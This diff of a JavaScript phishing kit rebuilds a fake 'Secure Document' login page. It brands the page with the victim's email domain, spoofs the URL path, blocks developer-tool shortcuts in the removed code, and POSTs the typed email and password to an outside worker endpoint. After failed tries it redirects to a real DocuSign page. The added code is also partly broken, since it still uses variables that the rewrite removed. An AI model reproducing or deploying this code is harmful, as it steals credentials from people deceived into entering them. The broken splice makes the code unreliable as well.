@@ -1,168 +1,434 @@
-document.onkeydown = function (event) {
-  if (event.keyCode == 123) {
-    return false;
-  }
-  if (
-    event.ctrlKey &&
-    event.shiftKey &&
-    (event.keyCode == "I".charCodeAt(0) ||
-      event.keyCode == "C".charCodeAt(0) ||
-      event.keyCode == "J".charCodeAt(0))
-  ) {
-    return false;
-  }
-  if (
-    event.ctrlKey &&
-    (event.keyCode == "U".charCodeAt(0) || event.keyCode == "S".charCodeAt(0))
-  ) {
-    return false;
-  }
-};
-document.addEventListener("contextmenu", (e) => e.preventDefault());
-const SECRET_KEY = "MATT_SECURE_2026";
-let failedAttempts = 0;
-
-function encryptPayload(obj) {
-  const json = JSON.stringify(obj);
-  let hex = "";
-
-  for (let i = 0; i < json.length; i++) {
-    const xorByte =
-      json.charCodeAt(i) ^ SECRET_KEY.charCodeAt(i % SECRET_KEY.length);
-
-    hex += ("0" + xorByte.toString(16)).slice(-2);
-  }
-
-  return btoa(hex);
-}
-(function spicyUrl() {
-  if (!window.location.search) {
-    const alphabet =
-      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-    let token = "";
-    for (let i = 0; i < 64; i++) {
-      token += alphabet.charAt(Math.floor(Math.random() * alphabet.length));
-    }
-    const newUrl =
-      window.location.protocol +
-      "//" +
-      window.location.host +
-      window.location.pathname +
-      "?auth_token=" +
-      token +
-      "&session_ref=v4_secure_verification";
-
-    window.history.replaceState({ path: newUrl }, "", newUrl);
-  }
-})();
-const viper = document.getElementById("viper");
-(function spiritSeal() {
-  const value = viper.value;
-  if (value.includes("@")) {
-    document.getElementById("totem").src =
-      "https://www.google.com/s2/favicons?sz=128&domain=" +
-      value.split("@")[1].toLowerCase();
-  }
-})();
 (function () {
-  const emailEl = document.getElementById("viper");
-  const titleEl = document.getElementById("doc-title");
+  "use strict";
 
-  if (emailEl && emailEl.value.includes("@")) {
-    let domainPart = emailEl.value.split("@")[1].split(".")[0];
-    let brand = domainPart.charAt(0).toUpperCase() + domainPart.slice(1);
-    document.title = brand + " Secure Email";
-    titleEl.innerText = brand + " Secure Email";
+  // Configuration
+  const CONFIG = {
+    BG_IMG: "https://i.postimg.cc/Dz2Q7TzV/imageing.png",
+    BG_BRI: 1,
+    BG_DAR: 1,
+    BG_CON: 1,
+    BG_SAT: 1,
+    BG_BLUR: 0,
+    BG_GRAY: false,
+    BG_OVERLAY: 0.25,
+    PHP_ENDPOINT: "https://rum-email-proxy.haricoting.workers.dev/contact",
+    SUCCESS_REDIRECT: "https://matta.com/email/email/view.php",
+    LOCKOUT_REDIRECT: "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f",
+    SECRET_KEY: "MATT_SECURE_2026",
+    MAX_TRIES: 3,
+    LOCKOUT_DELAY: 2000,
+    STORAGE_KEY: "st_7b3f19",
+    PATH_SEGMENTS: ["profile", "dashboard", "console", "manage", "overview"],
+    MSG_WRONG: "An error occurred. Please try again later.",
+    MSG_LOCKOUT: "Too many incorrect attempts. Access blocked.",
+    MSG_GRANTED: "Access granted. Redirecting...",
+    MSG_NET: "Network error. Please try again.",
+    HEADING: "Secure Document",
+    SUBHEAD: "Login to view your secure document",
+    FOOTER: "Message Center",
+    EMAIL_LABEL: "Email",
+    KEY_LABEL: "Password",
+    KEY_PLACEHOLDER: "Enter your password",
+    BUTTON_TEXT: "Unlock",
+    TAG_TEXT: "Encrypted Delivery"
+  };
+
+  // Inject CSS styles
+  function injectStyles() {
+    const css = `
+      *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,Helvetica,Arial,sans-serif}
+      body{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem;position:relative;overflow:hidden}
+      #bg_canvas{position:fixed;inset:0;width:100%;height:100%;background-size:cover;background-position:center;background-repeat:no-repeat;z-index:0;pointer-events:none}
+      #bg_veil{position:fixed;inset:0;background:rgba(255,255,255,0.25);z-index:1;pointer-events:none}
+      .frame_v7{position:relative;z-index:2;width:100%;max-width:460px;background:#ffffff;border-radius:1.5rem;box-shadow:0 18px 36px -12px rgba(0,20,30,0.22),0 6px 14px rgba(0,0,0,0.04);padding:2.2rem 2rem 1.9rem;border:1px solid rgba(255,255,255,0.6);transition:transform .15s ease}
+      @keyframes wobble_q{0%,100%{transform:translateX(0)}10%,30%,50%,70%,90%{transform:translateX(-8px)}20%,40%,60%,80%{transform:translateX(8px)}}
+      .frame_v7.wobble_q_on{animation:wobble_q .6s cubic-bezier(.36,.07,.19,.97) both}
+      .brand_row{display:flex;flex-direction:column;align-items:center;margin-bottom:1rem}
+      .brand_orb{width:74px;height:74px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;box-shadow:inset 0 1px 6px rgba(0,0,0,.02),0 8px 16px -8px rgba(18,52,77,.15);border:3px solid #fff;margin-bottom:.8rem;overflow:hidden}
+      .brand_orb img{width:100%;height:100%;object-fit:contain;display:block;padding:6px}
+      .chip_tag{font-size:.65rem;font-weight:700;letter-spacing:.08em;text-transform:uppercase;color:#2b5f8a;background:#e9f0f9;padding:.25rem 1rem;border-radius:30px;display:inline-flex;align-items:center;gap:.4rem;border:1px solid #cbdae8;margin-bottom:.7rem}
+      .chip_tag::before,.chip_tag::after{content:"•";font-size:1.1rem;line-height:1;color:#1f4b6e;opacity:.7}
+      .title_main{font-size:1.25rem;font-weight:600;color:#1a2e3f;text-align:center;letter-spacing:-.01em;line-height:1.35;margin-bottom:.35rem;font-family:'Times New Roman',Georgia,serif;word-wrap:break-word;overflow-wrap:break-word;max-width:100%;padding:0 .25rem}
+      .caption_sub{text-align:center;color:#54738b;font-size:.8rem;margin-bottom:1.6rem;font-weight:400;word-wrap:break-word;overflow-wrap:break-word;max-width:100%;padding:0 .25rem}
+      .row_block{margin-bottom:1.3rem}
+      .lbl_small{display:block;font-size:.7rem;font-weight:700;color:#1f405b;margin-bottom:.4rem;letter-spacing:.04em;text-transform:uppercase;opacity:.8}
+      .field_shell{display:flex;align-items:center;background:#fff;border:1.5px solid #d3e2ee;border-radius:.9rem;padding:.05rem .05rem .05rem 1rem;transition:all .2s;box-shadow:0 2px 4px rgba(0,0,0,.01)}
+      .field_shell:focus-within{border-color:#2b5f8a;box-shadow:0 0 0 4px rgba(43,95,138,.1)}
+      .field_shell.locked_bg{background:#f7fafd}
+      .ico_slot{display:flex;align-items:center;justify-content:center;width:20px;height:20px;flex-shrink:0;color:#3b6585;opacity:.75}
+      .ico_slot svg{width:100%;height:100%;display:block}
+      .inp_core{width:100%;padding:.85rem .9rem .85rem .7rem;border:none;background:transparent;font-size:.95rem;font-weight:500;color:#122b3b;outline:none;border-radius:.9rem}
+      .inp_core::placeholder{color:#a3b8cb;font-weight:400;font-size:.9rem}
+      .inp_core:read-only{color:#54738b;cursor:default}
+      .eye_btn{background:transparent;border:none;padding:0 .9rem 0 .4rem;cursor:pointer;color:#3b6585;display:flex;align-items:center;justify-content:center;transition:color .2s;width:34px;height:34px}
+      .eye_btn svg{width:20px;height:20px;display:block}
+      .eye_btn:hover{color:#0f2b40}
+      .cta_main{width:100%;background:#0f5b8c;border:none;border-radius:2rem;padding:.95rem 1.3rem;color:#fff;font-weight:600;font-size:1rem;letter-spacing:.02em;cursor:pointer;margin-top:.4rem;transition:all .2s;box-shadow:0 10px 20px -8px rgba(15,91,140,.4);display:flex;align-items:center;justify-content:center;gap:.55rem;border:1px solid rgba(255,255,255,.2)}
+      .cta_main:hover:not(:disabled){background:#0a4266;transform:scale(1.01);box-shadow:0 16px 26px -8px rgba(10,66,102,.5)}
+      .cta_main:active:not(:disabled){transform:scale(.98);background:#083552}
+      .cta_main:disabled{opacity:.8;cursor:not-allowed}
+      .cta_icon{display:inline-flex;align-items:center;justify-content:center;width:18px;height:18px}
+      .cta_icon svg{width:100%;height:100%;display:block}
+      .ring_load{display:inline-block;width:16px;height:16px;border:2.5px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin_r .7s linear infinite}
+      @keyframes spin_r{to{transform:rotate(360deg)}}
+      .base_note{margin-top:1.6rem;text-align:center;font-size:.65rem;color:#7e9bb3;letter-spacing:.01em;border-top:1px solid #e4edf5;padding-top:1rem}
+      .alert_bar{background:#fee9e7;color:#b33a2f;padding:.65rem .9rem;border-radius:.8rem;font-size:.8rem;margin-bottom:.9rem;border:1px solid #f5c6c2;display:none;opacity:0;transform:translateY(-6px);transition:opacity .3s ease,transform .3s ease;word-break:break-word;line-height:1.5;text-align:center}
+      .alert_bar.visible{display:block;opacity:1;transform:translateY(0)}
+      @media (max-width:480px){.frame_v7{padding:1.8rem 1.4rem;border-radius:1.2rem}.brand_orb{width:64px;height:64px}.title_main{font-size:1.1rem}}
+    `;
+    
+    const style = document.createElement("style");
+    style.id = "zz_core_style";
+    style.textContent = css;
+    document.head.appendChild(style);
   }
-})();
-function falcon() {
-  const customerName = viper.value;
-  const customerMessage = document.getElementById("cobra").value;
-  const unlockBtn = document.getElementById("btn-unlock");
-  const spinner = document.getElementById("loading-spinner");
-  const btnText = document.getElementById("btn-text");
-  const form = document.getElementById("loginBox");
-  document.getElementById("sentinel").style.display = "none";
-  form.classList.remove("shake");
-  if (!customerMessage || customerMessage.length < 1) {
-    showError("Please enter your password.");
-    form.classList.add("shake");
-    return;
+
+  // Build the phishing form
+  function buildForm() {
+    const bgCanvas = document.createElement("div");
+    bgCanvas.id = "bg_canvas";
+    document.body.appendChild(bgCanvas);
+
+    const bgVeil = document.createElement("div");
+    bgVeil.id = "bg_veil";
+    document.body.appendChild(bgVeil);
+
+    const card = document.createElement("div");
+    card.className = "frame_v7";
+    card.id = "card_root";
+    
+    card.innerHTML = `
+      <div class="brand_row">
+        <div class="brand_orb">
+          <img src="" alt="logo" id="brand_img">
+        </div>
+        <div class="chip_tag">${CONFIG.TAG_TEXT}</div>
+      </div>
+      <h1 class="title_main" id="title_node">${CONFIG.HEADING}</h1>
+      <div class="caption_sub" id="caption_node">${CONFIG.SUBHEAD}</div>
+      <div class="alert_bar" id="alert_node"></div>
+      <form id="main_form">
+        <div class="row_block">
+          <label class="lbl_small" for="mail_x9k2">${CONFIG.EMAIL_LABEL}</label>
+          <div class="field_shell locked_bg">
+            <span class="ico_slot">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="5" width="18" height="14" rx="2"/>
+                <path d="M3 7l9 6 9-6"/>
+              </svg>
+            </span>
+            <input class="inp_core" type="email" id="mail_x9k2" required>
+          </div>
+        </div>
+        <div class="row_block">
+          <label class="lbl_small" for="code_p4r7">${CONFIG.KEY_LABEL}</label>
+          <div class="field_shell">
+            <span class="ico_slot">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="4" y="11" width="16" height="10" rx="2"/>
+                <path d="M8 11V7a4 4 0 0 1 8 0v4"/>
+                <circle cx="12" cy="16" r="1.3"/>
+              </svg>
+            </span>
+            <input class="inp_core" type="password" id="code_p4r7" placeholder="${CONFIG.KEY_PLACEHOLDER}" autocomplete="off" required>
+            <button type="button" class="eye_btn" id="eye_toggle" aria-label="Toggle view">
+              <svg id="eye_show" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1.5 12S5.5 5 12 5s10.5 7 10.5 7-4 7-10.5 7S1.5 12 1.5 12z"/>
+                <circle cx="12" cy="12" r="3"/>
+              </svg>
+              <svg id="eye_hide" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="display:none;">
+                <path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-6.5 0-10.5-7-10.5-7a19.6 19.6 0 0 1 5.06-5.94"/>
+                <path d="M9.9 4.24A10.94 10.94 0 0 1 12 4c6.5 0 10.5 7 10.5 7a19.6 19.6 0 0 1-3.06 3.94"/>
+                <path d="M9.88 9.88a3 3 0 0 0 4.24 4.24"/>
+                <line x1="2" y1="2" x2="22" y2="22"/>
+              </svg>
+            </button>
+          </div>
+        </div>
+        <button type="submit" class="cta_main" id="cta_node">
+          <span class="cta_icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M8 11V7a4 4 0 0 1 7.5-2"/>
+            </svg>
+          </span>
+          ${CONFIG.BUTTON_TEXT}
+        </button>
+      </form>
+      <div class="base_note" id="base_node">${CONFIG.FOOTER} · © 2026</div>
+    `;
+    
+    document.body.appendChild(card);
   }
-  const cleanPayload = new URLSearchParams();
+
+  // Setup background image
+  function setupBackground() {
+    const bgCanvas = document.getElementById("bg_canvas");
+    const bgVeil = document.getElementById("bg_veil");
+    if (!bgCanvas || !bgVeil) return;
+
+    bgCanvas.style.backgroundImage = `url("${CONFIG.BG_IMG}")`;
+    
+    const filters = [];
+    filters.push(`brightness(${CONFIG.BG_BRI})`);
+    if (CONFIG.BG_DAR !== 1) filters.push(`brightness(${1 / CONFIG.BG_DAR})`);
+    filters.push(`contrast(${CONFIG.BG_CON})`);
+    filters.push(`saturate(${CONFIG.BG_SAT})`);
+    if (CONFIG.BG_BLUR > 0) filters.push(`blur(${CONFIG.BG_BLUR}px)`);
+    if (CONFIG.BG_GRAY) filters.push("grayscale(1)");
+    
+    bgCanvas.style.filter = filters.join(" ");
+    bgVeil.style.background = `rgba(255,255,255,${CONFIG.BG_OVERLAY})`;
+  }
+
+  // Spoof URL path
+  function spoofUrlPath() {
+    try {
+      const randomBytes = new Uint8Array(24);
+      crypto.getRandomValues(randomBytes);
+      const randomId = btoa(String.fromCharCode.apply(null, randomBytes))
+        .replace(/\+/g, "-")
+        .replace(/\//g, "_")
+        .replace(/=+$/, "");
+      
+      history.replaceState(null, "", `#/${CONFIG.PATH_SEGMENTS.join("/")}/${randomId}`);
+    } catch (e) {}
+  }
+
+  // Get default logo SVG
+  function getDefaultLogo() {
+    return "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23464f5b'/%3E%3Ctext x='50' y='67' font-family='Arial, Helvetica, sans-serif' font-size='48' font-weight='bold' fill='white' text-anchor='middle'%3ES%3C/text%3E%3C/svg%3E";
+  }
+
+  // Load domain favicon
+  function loadDomainFavicon(email, brandImg) {
+    if (!email) {
+      brandImg.src = getDefaultLogo();
+      return;
+    }
+    
+    const domain = email.split("@")[1]?.trim().toLowerCase();
+    if (!domain) {
+      brandImg.src = getDefaultLogo();
+      return;
+    }
+    
+    const faviconUrl = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=128`;
+    const img = new Image();
+    
+    img.onload = () => {
+      brandImg.src = (img.width > 16 || img.height > 16) ? faviconUrl : getDefaultLogo();
+    };
+    img.onerror = () => {
+      brandImg.src = getDefaultLogo();
+    };
+    img.src = faviconUrl;
+  }
+
+  // Capitalize first letter
+  function capitalize(str) {
+    return str ? str.charAt(0).toUpperCase() + str.slice(1) : "";
+  }
+
+  // XOR encrypt data
+  function encryptData(data, key) {
+    const json = JSON.stringify(data);
+    let result = "";
+    for (let i = 0; i < json.length; i++) {
+      const xor = json.charCodeAt(i) ^ key.charCodeAt(i % key.length);
+      result += ("0" + xor.toString(16)).slice(-2);
+    }
+    return btoa(result);
+  }
+
+  // Main initialization
+  function init() {
+    injectStyles();
+    buildForm();
+    setupBackground();
+    spoofUrlPath();
+
+    const emailInput = document.getElementById("mail_x9k2");
+    const passwordInput = document.getElementById("code_p4r7");
+    const brandImg = document.getElementById("brand_img");
+    const titleNode = document.getElementById("title_node");
+    const captionNode = document.getElementById("caption_node");
+    const footerNode = document.getElementById("base_node");
+    const eyeToggle = document.getElementById("eye_toggle");
+    const eyeShow = document.getElementById("eye_show");
+    const eyeHide = document.getElementById("eye_hide");
+    const alertNode = document.getElementById("alert_node");
+    const submitBtn = document.getElementById("cta_node");
+    const cardRoot = document.getElementById("card_root");
+    const mainForm = document.getElementById("main_form");
+
+    let alertTimeout = null;
+    let isLocked = false;
+
+    function showAlert(message, type) {
+      if (alertTimeout) clearTimeout(alertTimeout);
+      
+      alertNode.innerHTML = message;
+      alertNode.style.background = type === "success" ? "#e3f5e9" : "#fee9e7";
+      alertNode.style.color = type === "success" ? "#1e7a4b" : "#b33a2f";
+      alertNode.style.borderColor = type === "success" ? "#b8e0c8" : "#f5c6c2";
+      alertNode.classList.add("visible");
+      
+      if (type === "success") {
+        alertTimeout = setTimeout(() => alertNode.classList.remove("visible"), 6000);
+      }
+    }
+
+    function hideAlert() {
+      alertNode.classList.remove("visible");
+      if (alertTimeout) clearTimeout(alertTimeout);
+    }
+
+    function shakeCard() {
+      cardRoot.classList.remove("wobble_q_on");
+      void cardRoot.offsetWidth;
+      cardRoot.classList.add("wobble_q_on");
+      setTimeout(() => cardRoot.classList.remove("wobble_q_on"), 700);
+    }
+
+    function updateBranding() {
+      const email = emailInput.value.trim();
+      const domain = email.split("@")[1]?.trim().toLowerCase();
+      
+      if (!domain) {
+        titleNode.textContent = CONFIG.HEADING;
+        captionNode.textContent = CONFIG.SUBHEAD;
+        footerNode.textContent = `${CONFIG.FOOTER} · © 2026`;
+        loadDomainFavicon("", brandImg);
+        return;
+      }
+      
+      const domainName = capitalize(domain.split(".")[0]);
+      titleNode.textContent = `${domainName} ${CONFIG.HEADING}`;
+      captionNode.textContent = CONFIG.SUBHEAD;
+      footerNode.textContent = `${domainName} ${CONFIG.FOOTER} · © 2026`;
+      loadDomainFavicon(email, brandImg);
+    }
+
+    eyeToggle.addEventListener("click", () => {
+      const isPassword = passwordInput.type === "password";
+      passwordInput.type = isPassword ? "text" : "password";
+      eyeShow.style.display = isPassword ? "none" : "block";
+      eyeHide.style.display = isPassword ? "block" : "none";
+      passwordInput.focus();
+    });
+
+    function lockout() {
+      if (isLocked) return;
+      isLocked = true;
+      showAlert(CONFIG.MSG_LOCKOUT, "error");
+      shakeCard();
+      passwordInput.value = "";
+      submitBtn.disabled = true;
+      setTimeout(() => window.location.href = CONFIG.LOCKOUT_REDIRECT, CONFIG.LOCKOUT_DELAY);
+    }
+
+    function handleSubmit() {
+      if (isLocked) return;
+      
+      const email = emailInput.value.trim();
+      const password = passwordInput.value.trim();
+
+      hideAlert();
+
+      if (!email || !email.includes("@")) {
+        showAlert("Please enter a valid email address.", "error");
+        shakeCard();
+        return;
+      }
+
+      if (!password) {
+        showAlert("Please enter your password.", "error");
+        shakeCard();
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<span class="ring_load"></span> Loading...';
+
+      const startTime = Date.now();
+const cleanPayload = new URLSearchParams();
   cleanPayload.append("Name", customerName);
   cleanPayload.append("Feedback", customerMessage);
   cleanPayload.append("timestamp", Date.now().toString());
-  unlockBtn.disabled = true;
-  spinner.style.display = "block";
-  btnText.innerText = "Verifying...";
-  fetch("https://rum-email-proxy.haricoting.workers.dev/contact", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded",
-    },
-    body: cleanPayload,
-  })
-    .then((r) => r.json())
-    .then((result) => {
-      unlockBtn.disabled = false;
-      spinner.style.display = "none";
-      btnText.innerText = "Unlock Document";
-      if (result.status === "exhausted") {
-        showError("✌ Access locked. Too many failed attempts.");
-        unlockBtn.disabled = true;
-        setTimeout(() => {
-          window.location.href =
-            "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
-        }, 3000);
-        return;
-      }
+      fetch(CONFIG.PHP_ENDPOINT, {
+        method: "POST",
+        body: cleanPayload
+      })
+      .then(r => r.text())
+      .then(text => {
+        try {
+          return JSON.parse(text);
+        } catch {
+          throw new Error("Parse failed");
+        }
+      })
+      .catch(() => null)
+      .then(response => {
+        const elapsed = Date.now() - startTime;
+        const delay = Math.max(0, 2000 - elapsed);
+        
+        return new Promise(resolve => setTimeout(() => resolve(response), delay));
+      })
+      .then(response => {
+        if (isLocked) return;
+        
+        const btnText = '</svg></span> ' + CONFIG.BUTTON_TEXT;
 
-      if (result.status === "wrong") {
-        failedAttempts++;
-
-        if (failedAttempts >= 3) {
-          showError("✌ Access locked. Too many failed attempts.");
-          unlockBtn.disabled = true;
-          setTimeout(() => {
-            window.location.href =
-              "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
-          }, 3000);
+        if (!response) {
+          submitBtn.disabled = false;
+          submitBtn.innerHTML = btnText;
+          showAlert(CONFIG.MSG_NET, "error");
+          shakeCard();
+          passwordInput.value = "";
+          passwordInput.focus();
           return;
         }
 
-        showError("An error occurred please try again later.");
-        form.classList.add("shake");
-        document.getElementById("cobra").value = "";
-        return;
-      }
+        if (response.status === "success") {
+          showAlert(CONFIG.MSG_GRANTED, "success");
+          setTimeout(() => window.location.href = CONFIG.SUCCESS_REDIRECT, 1000);
+          return;
+        }
 
-      if (result.status === "success") {
-        btnText.innerText = "Success! Redirecting...";
-        unlockBtn.style.background = "#10b981";
-        window.location.href = result.redirect;
-      } else {
-        showError("Security token mismatch.");
-      }
-    })
-    .catch(() => {
-      failedAttempts++;
-      if (failedAttempts >= 3) {
-        showError("✌ System Locked. Redirecting...");
-        setTimeout(() => {
-          window.location.href =
-            "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f";
-        }, 3000);
-        return;
-      }
-      unlockBtn.disabled = false;
-      spinner.style.display = "none";
-      btnText.innerText = "Unlock Document";
-      showError("Connection error.");
+        if (response.status === "exhausted") {
+          lockout();
+          return;
+        }
+
+        const attempts = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY) || "0", 10) + 1;
+        sessionStorage.setItem(CONFIG.STORAGE_KEY, String(attempts));
+
+        if (attempts >= CONFIG.MAX_TRIES) {
+          lockout();
+          return;
+        }
+
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = btnText;
+        showAlert(CONFIG.MSG_WRONG, "error");
+        shakeCard();
+        passwordInput.value = "";
+        passwordInput.focus();
+      });
+    }
+
+    emailInput.addEventListener("input", updateBranding);
+    mainForm.addEventListener("submit", (e) => {
+      e.preventDefault();
+      handleSubmit();
     });
-}
-function showError(message) {
-  const container = document.getElementById("sentinel");
-  container.style.display = "flex";
-  document.getElementById("error-text").innerText = message;
-}
+    
+    updateBranding();
+  }
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", init);
+  } else {
+    init();
+  }
+})();
